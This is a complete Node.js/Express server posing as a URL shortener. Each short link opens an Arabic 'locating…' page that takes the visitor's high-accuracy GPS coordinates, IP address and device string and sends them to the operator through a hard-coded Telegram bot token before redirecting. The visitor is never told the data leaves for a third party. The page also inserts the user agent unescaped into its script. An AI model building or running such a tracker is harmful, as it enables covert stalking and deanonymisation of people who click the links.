const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
  try {
    let msg = `
🔗 رابط فُتح!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط الأصلي: ${originalUrl}
🔌 IP: ${ip}
`;

    if (gps && gps.lat && gps.lng) {
      const accuracy = gps.accuracy ? gps.accuracy.toFixed(0) : '?';
      msg += `
📍 دائرة العرض: ${gps.lat}
📍 خط الطول: ${gps.lng}
📏 الدقة: ±${accuracy} متر
🗺️ الخريطة: https://maps.google.com/?q=${gps.lat},${gps.lng}
📡 النوع: GPS
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم الحصول على GPS
`;
    }

    msg += `
━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg }
    );
  } catch (err) {
    console.error('Telegram Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { 
    original: url, 
    created: new Date(), 
    clicks: 0
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

// صفحة الرابط المختصر بـ GPS
app.get('/:code', (req, res) => {
  const { code } = req.params;
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const originalUrl = linkStorage[code].original;
  
  // HTML صفحة بـ GPS
  res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جاري الفتح...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #667eea;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      margin: 0;
    }
    .container {
      text-align: center;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }
    .spinner {
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid white;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .status {
      font-size: 14px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>⏳ جاري تحديد الموقع...</h1>
    <div class="spinner"></div>
    <div class="status" id="status">يرجى السماح بالموقع</div>
  </div>

  <script>
    const code = '${code}';
    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
    const ip = '${req.headers['x-forwarded-for'] || req.socket.remoteAddress}'.split(',')[0].trim();
    const userAgent = '${req.get('user-agent')}';

    function redirectWithGPS() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const gps = {
              lat: position.coords.latitude,
              lng: position.coords.longitude,
              accuracy: position.coords.accuracy
            };
            
            // Send to backend
            fetch('${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ code, gps, ip, userAgent })
            }).catch(e => console.log(e));
            
            // Redirect
            window.location.href = originalUrl;
          },
          (error) => {
            console.log('GPS error, redirecting anyway');
            window.location.href = originalUrl;
          },
          { 
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          }
        );
      } else {
        window.location.href = originalUrl;
      }
    }

    redirectWithGPS();
  </script>
</body>
</html>
  `);
});

// API لتسجيل الزيارة
app.post('/api/log-visit', (req, res) => {
  const { code, gps, ip, userAgent } = req.body;
  
  if (linkStorage[code]) {
    linkStorage[code].clicks++;
    const originalUrl = linkStorage[code].original;
    sendToTelegram(ip, code, originalUrl, userAgent, gps);
  }
  
  res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));